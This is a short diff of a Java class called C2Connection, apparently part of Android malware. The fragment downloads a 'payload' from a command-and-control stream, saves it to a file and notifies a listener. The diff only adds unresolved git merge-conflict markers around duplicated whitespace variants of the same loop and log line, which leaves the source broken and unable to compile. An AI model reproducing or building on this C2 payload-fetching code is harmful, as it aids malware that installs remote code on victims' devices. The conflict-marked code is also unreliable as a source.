@@ -116,19 +116,32 @@ public class C2Connection {
                 int bytesRead;
                 long totalBytesRead = 0;
 
+<<<<<<< Updated upstream
                 while (totalBytesRead < fileSize && 
                        (bytesRead = in.read(buffer, 0, (int)Math.min(buffer.length, fileSize - totalBytesRead))) != -1) {
                     fos.write(buffer, 0, bytesRead);
                     totalBytesRead += bytesRead;
                 }
                 
+=======
+                while (totalBytesRead < fileSize &&
+                        (bytesRead = in.read(buffer, 0, (int)Math.min(buffer.length, fileSize - totalBytesRead))) != -1) {
+                    fos.write(buffer, 0, bytesRead);
+                    totalBytesRead += bytesRead;
+                }
+
+>>>>>>> Stashed changes
                 if (totalBytesRead == fileSize) {
                     Log.i(TAG, "Payload successfully saved to: " + filePath);
                     if (listener != null) {
                         listener.onPayloadReceived(filePath);
                     }
                 } else {
+<<<<<<< Updated upstream
                      Log.e(TAG, "Payload download incomplete. Expected " + fileSize + " but got " + totalBytesRead);
+=======
+                    Log.e(TAG, "Payload download incomplete. Expected " + fileSize + " but got " + totalBytesRead);
+>>>>>>> Stashed changes
                 }
             }
         } catch (Exception e) {
